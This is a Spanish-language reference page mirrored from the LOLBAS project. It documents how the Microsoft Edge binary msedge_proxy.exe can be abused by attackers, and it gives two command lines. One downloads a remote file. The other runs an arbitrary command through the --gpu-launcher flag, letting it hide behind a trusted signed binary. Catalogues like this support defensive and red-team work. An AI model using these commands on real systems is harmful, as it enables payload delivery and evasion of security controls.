# LOLBAS: msedge_proxy.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`, `Execute`

Microsoft Edge Browser

## Comandos

### Download file from the internet

Download · priv: User · T1105

```cmd
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
```

msedge_proxy will download malicious file.

### Executes a process under a trusted Microsoft signed binary

Execute · priv: User · T1218.015

```cmd
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
```

msedge_proxy.exe will execute file in the background

